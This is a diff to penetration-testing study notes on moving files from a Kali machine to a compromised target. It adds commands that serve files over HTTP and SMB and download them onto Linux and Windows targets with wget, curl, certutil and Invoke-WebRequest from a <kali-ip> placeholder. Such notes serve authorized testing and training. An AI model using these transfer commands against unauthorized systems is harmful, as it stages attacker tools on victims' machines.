@@ -2,7 +2,26 @@
 
 [← Foothold quick reference](../02-foothold.md)
 
-The [quick reference](../02-foothold.md#file-transfer) has HTTP, SMB, `wget`, `curl`, `certutil`, and PowerShell download commands. These are the extra checks for Windows-to-Kali copies.
+Serve a known directory and check the received file's length or checksum before running it.
+
+```bash
+python3 -m http.server 8000
+impacket-smbserver share /path/to/files -smb2support
+```
+
+From a Linux target:
+
+```bash
+wget http://<kali-ip>:8000/file -O /tmp/file
+curl http://<kali-ip>:8000/file -o /tmp/file
+```
+
+From a Windows target:
+
+```powershell
+certutil -urlcache -split -f http://<kali-ip>:8000/file.exe file.exe
+Invoke-WebRequest http://<kali-ip>:8000/file.exe -OutFile file.exe
+```
 
 ## Authenticated SMB share
 
